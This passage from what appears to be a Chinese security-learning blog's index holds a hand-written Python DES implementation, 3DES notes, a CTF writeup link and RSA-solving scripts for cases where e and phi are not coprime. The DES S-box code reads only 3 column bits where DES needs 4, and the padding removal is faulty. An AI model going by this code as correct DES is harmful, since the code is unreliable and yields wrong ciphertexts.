class="number">0xe</span>, <span class="number">0x7</span>, <span class="number">0x4</span>, <span class="number">0xa</span>, <span class="number">0x8</span>, <span class="number">0xd</span>, <span class="number">0xf</span>, <span class="number">0xc</span>, <span class="number">0x9</span>, <span class="number">0x0</span>, <span class="number">0x3</span>, <span class="number">0x5</span>, <span class="number">0x6</span>, <span class="number">0xb</span>,</span><br><span class="line">            ],</span><br><span class="line">        ]  <span class="comment"># 16进制表示S盒的数据，S盒是为了将48位转换为32位，有8个盒子</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__substitution</span>(<span class="params">self, table: <span class="built_in">str</span>, self_table: <span class="built_in">list</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :param table: 需要进行置换的列表,是一个01字符串</span></span><br><span class="line"><span class="string">        :param self_table: 置换表，在__init__中初始化了</span></span><br><span class="line"><span class="string">        :return: 返回置换后的01字符串</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        sub_result = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> self_table:</span><br><span class="line">            sub_result += table[i - <span class="number">1</span>]</span><br><span class="line">        <span class="keyword">return</span> sub_result</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">str2bin</span>(<span class="params">self, string: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        将明文转为二进制字符串:</span></span><br><span class="line"><span class="string">        :param string: 任意字符串</span></span><br><span class="line"><span class="string">        :return:二进制字符串</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        plaintext_list = <span class="built_in">list</span>(<span class="built_in">bytes</span>(string, <span class="string">&#x27;utf8&#x27;</span>))  <span class="comment"># 将字符串转成bytes类型，再转成list</span></span><br><span class="line">        result = []  <span class="comment"># 定义返回结果</span></span><br><span class="line">        <span class="keyword">for</span> num <span class="keyword">in</span> plaintext_list:</span><br><span class="line">            result.append(<span class="built_in">bin</span>(num)[<span class="number">2</span>:].zfill(<span class="number">8</span>))  <span class="comment"># 将列表的每个元素转成二进制字符串，8位宽度</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join(result)</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">bin2str</span>(<span class="params">self, binary: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        二进制字符串转成字符串</span></span><br><span class="line"><span class="string">        :param binary:</span></span><br><span class="line"><span class="string">        :return:</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        list_bin = [binary[i:i + <span class="number">8</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(binary), <span class="number">8</span>)]  <span class="comment"># 对二进制字符串进行切分，每8位为一组</span></span><br><span class="line">        list_int = []</span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> list_bin:</span><br><span class="line">            list_int.append(<span class="built_in">int</span>(b, <span class="number">2</span>))  <span class="comment"># 对二进制转成int</span></span><br><span class="line">        result = <span class="built_in">bytes</span>(list_int).decode()  <span class="comment"># 将列表转成bytes，在进行解码，得到字符串</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__bin2int</span>(<span class="params">self, binary: <span class="built_in">str</span></span>) -&gt; <span class="built_in">list</span>:</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        由于加密之后的二进制无法直接转成字符，有不可见字符在，utf8可能无法解码，所以需要将二进制字符串每8位转成int型号列表，用于转成bytes再转hex</span></span><br><span class="line"><span class="string">        :param binary: 二进制字符串</span></span><br><span class="line"><span class="string">        :return: int型列表</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        list_bin = [binary[i:i + <span class="number">8</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(binary), <span class="number">8</span>)]  <span class="comment"># 对二进制字符串进行切分，每8位为一组</span></span><br><span class="line">        list_int = []</span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> list_bin:</span><br><span class="line">            list_int.append(<span class="built_in">int</span>(b, <span class="number">2</span>))</span><br><span class="line">        <span class="keyword">return</span> list_int</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__int2bin</span>(<span class="params">self, list_int: <span class="built_in">list</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        result = []</span><br><span class="line">        <span class="keyword">for</span> num <span class="keyword">in</span> list_int:</span><br><span class="line">            result.append(<span class="built_in">bin</span>(num)[<span class="number">2</span>:].zfill(<span class="number">8</span>))</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(result)</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__get_block_list</span>(<span class="params">self, binary: <span class="built_in">str</span></span>) -&gt; <span class="built_in">list</span>:</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        对明文二进制串进行切分，每64位为一块，DES加密以64位为一组进行加密的</span></span><br><span class="line"><span class="string">        :type binary: 二进制串</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        len_binary = <span class="built_in">len</span>(binary)</span><br><span class="line">        <span class="keyword">if</span> len_binary % <span class="number">64</span> != <span class="number">0</span>:</span><br><span class="line">            binary_block = binary + (<span class="string">&quot;0&quot;</span> * (<span class="number">64</span> - (len_binary % <span class="number">64</span>)))</span><br><span class="line">            <span class="keyword">return</span> [binary_block[i:i + <span class="number">64</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(binary_block), <span class="number">64</span>)]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> [binary[j:j + <span class="number">64</span>] <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(binary), <span class="number">64</span>)]</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">modify_secretkey</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        修改默认密钥函数</span></span><br><span class="line"><span class="string">        :return: None</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;当前二进制形式密钥为:&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(self.K))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;当前字符串形式密钥为：&#123;&#125;&quot;</span>.<span class="built_in">format</span>(self.bin2str(self.K)))</span><br><span class="line">        newkey = <span class="built_in">input</span>(<span class="string">&quot;输入新的密钥（长度为8）：&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(newkey) != <span class="number">8</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;密钥长度不符合，请重新输入：&quot;</span>)</span><br><span class="line">            self.modify_secretkey()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            bin_key = self.str2bin(newkey)</span><br><span class="line">            self.K = bin_key</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;当前二进制形式密钥为:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(self.K))</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__f_funtion</span>(<span class="params">self, right: <span class="built_in">str</span>, key: <span class="built_in">str</span></span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :param right: 明文二进制的字符串加密过程的右半段</span></span><br><span class="line"><span class="string">        :param key: 当前轮数的密钥</span></span><br><span class="line"><span class="string">        :return: 进行E扩展，与key异或操作，S盒操作后返回32位01字符串</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="comment"># 对right进行E扩展</span></span><br><span class="line">        e_result = self.__substitution(right, self.E)</span><br><span class="line">        <span class="comment"># 与key 进行异或操作</span></span><br><span class="line">        xor_result = self.__xor_function(e_result, key)</span><br><span class="line">        <span class="comment"># 进入S盒子</span></span><br><span class="line">        s_result = self.__s_box(xor_result)</span><br><span class="line">        <span class="comment"># 进行P置换</span></span><br><span class="line">        p_result = self.__substitution(s_result, self.P)</span><br><span class="line">        <span class="keyword">return</span> p_result</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__get_key_list</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :return: 返回加密过程中16轮的子密钥</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        key = self.__substitution(self.K, self.k1)</span><br><span class="line">        left_key = key[<span class="number">0</span>:<span class="number">28</span>]</span><br><span class="line">        right_key = key[<span class="number">28</span>:<span class="number">56</span>]</span><br><span class="line">        keys = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">17</span>):</span><br><span class="line">            move = self.k0[i - <span class="number">1</span>]</span><br><span class="line">            move_left = left_key[move:<span class="number">28</span>] + left_key[<span class="number">0</span>:move]</span><br><span class="line">            move_right = right_key[move:<span class="number">28</span>] + right_key[<span class="number">0</span>:move]</span><br><span class="line">            left_key = move_left</span><br><span class="line">            right_key = move_right</span><br><span class="line">            move_key = left_key + right_key</span><br><span class="line">            ki = self.__substitution(move_key, self.k2)</span><br><span class="line">            keys.append(ki)</span><br><span class="line">        <span class="keyword">return</span> keys</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__xor_function</span>(<span class="params">self, xor1: <span class="built_in">str</span>, xor2: <span class="built_in">str</span></span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :param xor1: 01字符串</span></span><br><span class="line"><span class="string">        :param xor2: 01字符串</span></span><br><span class="line"><span class="string">        :return: 异或操作返回的结果</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        size = <span class="built_in">len</span>(xor1)</span><br><span class="line">        result = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, size):</span><br><span class="line">            result += <span class="string">&#x27;0&#x27;</span> <span class="keyword">if</span> xor1[i] == xor2[i] <span class="keyword">else</span> <span class="string">&#x27;1&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__s_box</span>(<span class="params">self, xor_result: <span class="built_in">str</span></span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :param xor_result: 48位01字符串</span></span><br><span class="line"><span class="string">        :return: 返回32位01字符串</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        result = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">8</span>):</span><br><span class="line">            <span class="comment"># 将48位数据分为6组，循环进行</span></span><br><span class="line">            block = xor_result[i * <span class="number">6</span>:(i + <span class="number">1</span>) * <span class="number">6</span>]</span><br><span class="line">            line = <span class="built_in">int</span>(block[<span class="number">0</span>] + block[<span class="number">5</span>], <span class="number">2</span>)</span><br><span class="line">            colmn = <span class="built_in">int</span>(block[<span class="number">1</span>:<span class="number">4</span>], <span class="number">2</span>)</span><br><span class="line">            res = <span class="built_in">bin</span>(self.S[i][line*<span class="number">16</span> + colmn])[<span class="number">2</span>:]</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(res) &lt; <span class="number">4</span>:</span><br><span class="line">                res = <span class="string">&#x27;0&#x27;</span> * (<span class="number">4</span> - <span class="built_in">len</span>(res)) + res</span><br><span class="line">            result += res</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__iteration</span>(<span class="params">self, bin_plaintext: <span class="built_in">str</span>, key_list: <span class="built_in">list</span></span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :param bin_plaintext: 01字符串，64位</span></span><br><span class="line"><span class="string">        :param key_list: 密钥列表，共16个</span></span><br><span class="line"><span class="string">        :return: 进行F函数以及和left异或操作之后的字符串</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        left = bin_plaintext[<span class="number">0</span>:<span class="number">32</span>]</span><br><span class="line">        right = bin_plaintext[<span class="number">32</span>:<span class="number">64</span>]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">16</span>):</span><br><span class="line">            next_lift = right</span><br><span class="line">            f_result = self.__f_funtion(right, key_list[i])</span><br><span class="line">            next_right = self.__xor_function(left, f_result)</span><br><span class="line">            left = next_lift</span><br><span class="line">            right = next_right</span><br><span class="line">        bin_plaintext_result = left + right</span><br><span class="line">        <span class="keyword">return</span> bin_plaintext_result[<span class="number">32</span>:] + bin_plaintext_result[:<span class="number">32</span>]</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">encode</span>(<span class="params">self, plaintext</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :param plaintext: 明文字符串</span></span><br><span class="line"><span class="string">        :return: 密文字符串</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        bin_plaintext = self.str2bin(plaintext)</span><br><span class="line">        bin_plaintext_block = self.__get_block_list(bin_plaintext)</span><br><span class="line">        ciphertext_bin_list = []</span><br><span class="line">        key_list = self.__get_key_list()</span><br><span class="line">        <span class="keyword">for</span> block <span class="keyword">in</span> bin_plaintext_block:</span><br><span class="line">            <span class="comment"># 初代ip置换</span></span><br><span class="line">            sub_ip = self.__substitution(block, self.ip)</span><br><span class="line">            ite_result = self.__iteration(sub_ip, key_list)</span><br><span class="line">            <span class="comment"># 逆ip置换</span></span><br><span class="line">            sub_ip1 = self.__substitution(ite_result, self.ip1)</span><br><span class="line">            ciphertext_bin_list.append(sub_ip1)</span><br><span class="line">        ciphertext_bin = <span class="string">&#x27;&#x27;</span>.join(ciphertext_bin_list)</span><br><span class="line">        result = self.__bin2int(ciphertext_bin)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">bytes</span>(result).<span class="built_in">hex</span>().upper()</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decode</span>(<span class="params">self, ciphertext</span>):</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        :param ciphertext: 密文字符串</span></span><br><span class="line"><span class="string">        :return: 明文字符串</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        b_ciphertext = binascii.a2b_hex(ciphertext)</span><br><span class="line">        bin_ciphertext = self.__int2bin(<span class="built_in">list</span>(b_ciphertext))</span><br><span class="line">        bin_plaintext_list = []</span><br><span class="line">        key_list = self.__get_key_list()</span><br><span class="line">        key_list = key_list[::-<span class="number">1</span>]</span><br><span class="line">        bin_ciphertext_block = [bin_ciphertext[i:i + <span class="number">64</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(bin_ciphertext), <span class="number">64</span>)]</span><br><span class="line">        <span class="keyword">for</span> block <span class="keyword">in</span> bin_ciphertext_block:</span><br><span class="line">            sub_ip = self.__substitution(block, self.ip)</span><br><span class="line">            ite = self.__iteration(sub_ip, key_list)</span><br><span class="line">            sub_ip1 = self.__substitution(ite, self.ip1)</span><br><span class="line">            bin_plaintext_list.append(sub_ip1)</span><br><span class="line">        bin_plaintext = <span class="string">&#x27;&#x27;</span>.join(bin_plaintext_list).replace(<span class="string">&#x27;00000000&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> self.bin2str(bin_plaintext)</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">self</span>):</span><br><span class="line">        select = <span class="built_in">input</span>(<span class="string">&quot;Please selecting:\n1、Encryption\t 2、Decrpytion\nYour selecting:&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> select == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">            plaintext = <span class="built_in">input</span>(<span class="string">&quot;Input plaintext：&quot;</span>)</span><br><span class="line">            <span class="comment"># print(&quot;Your plaintext is:&#123;&#125;&quot;.format(plaintext))</span></span><br><span class="line">            ciphertext = self.encode(plaintext)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;The ciphertext is:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(ciphertext))</span><br><span class="line">        <span class="keyword">elif</span> select == <span class="string">&#x27;2&#x27;</span>:</span><br><span class="line">            plaintext = <span class="built_in">input</span>(<span class="string">&quot;Input ciphertext：&quot;</span>)</span><br><span class="line">            <span class="comment"># print(&quot;Your ciphertext is:&#123;&#125;&quot;.format(plaintext))</span></span><br><span class="line">            plaintext = self.decode(plaintext)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;The plaintext is:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(plaintext))</span><br><span class="line">            <span class="comment"># print(len(plaintext))</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">input</span>(<span class="string">&quot;Please selecting again！&quot;</span>)</span><br><span class="line">            self.main()</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    mydes = ArrangeSimpleDES()</span><br><span class="line">    mydes.modify_secretkey()</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        mydes.main()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><p>另外要说的是，python也有模块可以直接进行des的加解密，但是真要考DES多半不会直接用这个就能出。。。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Cipher import DES</span><br><span class="line">message = b&#x27;&#x27;</span><br><span class="line">key = b&#x27;&#x27;</span><br><span class="line">cipher = DES.new(key, DES.MODE_ECB) #这里使用了ECB模式</span><br><span class="line">ciphertext = cipher.encrypt(message) #加密</span><br><span class="line">print(ciphertext)</span><br><span class="line">plain = cipher.decrypt(ciphertext) #解密</span><br><span class="line">print(plain)</span><br></pre></td></tr></table></figure><h2 id="3DES"><a href="#3DES" class="headerlink" title="3DES"></a>3DES</h2><p>由于DES的实际密钥长度只有56位，安全性并不高，于是便有了3DES，可以说是对明文进行了3次DES，因此密钥有168位。</p><p>流程如下（图来源<a href="https://blog.csdn.net/qq_41137136/article/details/86416849">这篇文章</a>）</p><h3 id="DES-EDE3"><a href="#DES-EDE3" class="headerlink" title="DES-EDE3"></a>DES-EDE3</h3><p>三个密钥都不同时</p><p><img src="/images/DES%E5%8A%A0%E5%AF%86/2019011314264658.png" alt="2019011314264658"></p><h3 id="DES-EDE2"><a href="#DES-EDE2" class="headerlink" title="DES-EDE2"></a>DES-EDE2</h3><p>当密钥1、3相同，密钥2不同时</p><p><img src="/images/DES%E5%8A%A0%E5%AF%86/20190113142411607.png" alt="20190113142411607"></p><p>当三个密钥都相同时，就成了普通的DES</p><h2 id="关于DES的攻击"><a href="#关于DES的攻击" class="headerlink" title="关于DES的攻击"></a>关于DES的攻击</h2><blockquote><p>这里有待补充</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Academic </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Crypto </tag>
            
            <tag> Academic </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HSCCTF2024 Writeup</title>
      <link href="/posts/86d6019a/"/>
      <url>/posts/86d6019a/</url>
      
        <content type="html"><![CDATA[<h4 id="Writeup"><a href="#Writeup" class="headerlink" title="Writeup"></a><a href="https://www.blog.st4rr.top/writeups/HSCCTF2024Writeup.pdf">Writeup</a></h4>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> HSCCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>密码学算法散记</title>
      <link href="/posts/e61125ce/"/>
      <url>/posts/e61125ce/</url>
      
        <content type="html"><![CDATA[<blockquote><p>在这里零散地记载一些密码学可能用到的算法脚本<del>（当裁缝）</del>，方便之后直接拿来用</p></blockquote><h2 id="RSA中的e-phi不互素问题"><a href="#RSA中的e-phi不互素问题" class="headerlink" title="RSA中的e,phi不互素问题"></a>RSA中的e,phi不互素问题</h2><p>参考了<a href="https://blog.csdn.net/m0_74345946/article/details/133936371">这篇文章</a></p><h3 id="换模"><a href="#换模" class="headerlink" title="换模"></a>换模</h3><p>当e和p-1或q-1互素时，可以转换到模p或模q下求解</p><p>假设e与p-1互素<br>$$<br>m^e\equiv c(mod\ n)<br>$$</p><p>$$<br>m^e&#x3D;c+kpq<br>$$</p><p>$$<br>m^e\ mod\ p&#x3D;c\ mod\ p+kpq\ mod\ p<br>$$</p><p>$$<br>m^e\equiv c(mod\ p)<br>$$</p><p>python实现：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">e=</span><br><span class="line">p=</span><br><span class="line">q=</span><br><span class="line">n=</span><br><span class="line">c=</span><br><span class="line"><span class="keyword">assert</span> gmpy2.gcd(e,p-<span class="number">1</span>)==<span class="number">1</span></span><br><span class="line">c=c%p</span><br><span class="line">phi=p-<span class="number">1</span></span><br><span class="line">d=gmpy2.invert(e,phi)</span><br><span class="line">m=<span class="built_in">pow</span>(c,d,p)</span><br></pre></td></tr></table></figure><h3 id="e-gcd-iroot-m-2"><a href="#e-gcd-iroot-m-2" class="headerlink" title="e&#x2F;&#x2F;gcd iroot(m,2)"></a>e&#x2F;&#x2F;gcd iroot(m,2)</h3><p>当gcd(e,phi)较小时，可以先将e&#x2F;&#x2F;gcd(e,phi)，使得e和phi互素后，再对算出的m开根</p><p>python实现：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">e=</span><br><span class="line">p=</span><br><span class="line">q=</span><br><span class="line">n=</span><br><span class="line">c=</span><br><span class="line">phi=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">_gcd=gmpy2.gcd(e,phi)</span><br><span class="line">e=e//_gcd</span><br><span class="line">d=gmpy2.invert(e,phi)</span><br><span class="line">m=gmpy2.iroot(<span class="built_in">pow</span>(c,d,p),_gcd)[<span class="number">0</span>]</span><br></pre></td></tr></table></figure><h3 id="有限域内开方"><a href="#有限域内开方" class="headerlink" title="有限域内开方"></a>有限域内开方</h3><p>有时，当e较小时，我们仍然无法用上面的方法得到m。这时，我们可以使用有限域内开方的方法。</p><p>前面我们已经证明了，当p为素数时，由<br>$$<br>m^e\equiv c(mod\ n)<br>$$<br>可以推知<br>$$<br>m^e\equiv c(mod\ p)<br>$$<br>于是我们可以设法找到所有满足<br>$$<br>m^e\equiv x^e\equiv c(mod\ p)<br>$$<br>的x，以及所有满足<br>$$<br>m^e\equiv y^e\equiv c(mod\ q)<br>$$<br>的y，从而列出<br>$$<br>\begin{cases}m\equiv x(mod\ p) \ m\equiv y(mod\ q)\end{cases}<br>$$<br>的方程组，通过中国剩余定理（CRT）求解。</p><p>下面是一个利用sagemath的程序实现</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">p = </span><br><span class="line">q = </span><br><span class="line">c = </span><br><span class="line">e = </span><br><span class="line">n = </span><br><span class="line"></span><br><span class="line">P.&lt;a&gt;=PolynomialRing(Zmod(p),implementation=<span class="string">&#x27;NTL&#x27;</span>)</span><br><span class="line">f=a^e-c</span><br><span class="line">mps=f.monic().roots()</span><br><span class="line"></span><br><span class="line">P.&lt;a&gt;=PolynomialRing(Zmod(q),implementation=<span class="string">&#x27;NTL&#x27;</span>)</span><br><span class="line">g=a^e-c</span><br><span class="line">mqs=g.monic().roots()</span><br><span class="line"></span><br><span class="line">flag=[]</span><br><span class="line"><span class="keyword">for</span> mpp <span class="keyword">in</span> mps:</span><br><span class="line">    x=mpp[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> mqq <span class="keyword">in</span> mqs:</span><br><span class="line">        y=mqq[<span class="number">0</span>]</span><br><span class="line">        solution = CRT_list([<span class="built_in">int</span>(x), <span class="built_in">int</span>(y)], [p, q])</span><br><span class="line">        flag.append(solution)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">    m=long_to_bytes(i)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;flag&#x27;</span><span class="keyword">in</span> m:</span><br><span class="line">        <span class="built_in">print</span>(m)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>当然也可以通过观察对算法进行一定的优化，详见上面给出的文章，这里不再赘述。</p><h3 id="AMM算法"><a href="#AMM算法" class="headerlink" title="AMM算法"></a>AMM算法</h3><p>参考了<a href="https://lov2.netlify.app/rsa_e_phi_not_coprime/">这篇文章</a></p><p>当e比较大的时候，我们可以使用AMM算法，它能够大大提高运算的速度</p><h4 id="原算法"><a href="#原算法" class="headerlink" title="原算法"></a>原算法</h4><p>先说明一下AMM算法的原算法，此时e&#x3D;2，p为奇素数，对于<br>$$<br>x^2\equiv r(mod\ p)<br>$$<br>我们先对两边开根<br>$$<br>x\equiv r^{\frac{1}{2}}(mod\ p)<br>$$<br>令p-1&#x3D;2^{s}t，又由欧拉定理得，<br>$$<br>r^{\frac{p-1}{2}}\equiv r^{2^{s-1}t}\equiv 1(mod\ p)<br>$$</p><h5 id="当s-1时，"><a href="#当s-1时，" class="headerlink" title="当s&#x3D;1时，"></a>当s&#x3D;1时，</h5><p>$$<br>r^t\equiv 1(mod\ p)<br>$$</p><p>两边同时乘r，再开根，即推出公式<br>$$<br>r^{\frac{t+1}{2}}\equiv \pm \sqrt r\equiv \pm x(mod\ p)<br>$$<br>将m和c代进去，就是这样(t可以根据p算出来)<br>$$<br>\pm m\equiv c^{\frac{t+1}{2}}<br>$$</p><h5 id="当s-1时，-1"><a href="#当s-1时，-1" class="headerlink" title="当s&gt;1时，"></a>当s&gt;1时，</h5><p>如果直接开根我们会得到一正一负两个式子<br>$$<br>r^{2^{s-2}t}\equiv 1(mod\ p)<br>$$</p><p>$$<br>r^{2^{s-2}t}\equiv -1(mod\ p)<br>$$</p><p>由上面得到的<br>$$<br>r^{2^{s-1}t}\equiv 1(mod\ p)<br>$$<br>两边同时乘上这个式子，并用k来控制是否要乘（k&#x3D;0,1）<br>$$<br>r^{2^{s-2}t}n^{2^{s-1}tk}\equiv 1(mod\ p)<br>$$<br>就这样反复对两边进行开方操作，直至回到前面s&#x3D;1的情况，即<br>$$<br>r^tn^{t*(2k_1+2^2k_2+…+2^{s-1}k_{s-1})}\equiv 1(mod\ p)<br>$$<br>两边乘上r再开方<br>$$<br>r^{\frac{t+1}{2}}n^{t*(k_1+2k_2+…+2^{s-2}k_{s-1})}\equiv\pm  \sqrt r\equiv \pm x(mod\ p)<br>$$<br>将m和c代进去，得到<br>$$<br>c^{\frac{t+1}{2}}n^{t*(k_1+2k_2+…+2^{s-2}k_{s-1})}\equiv \pm m(mod\ 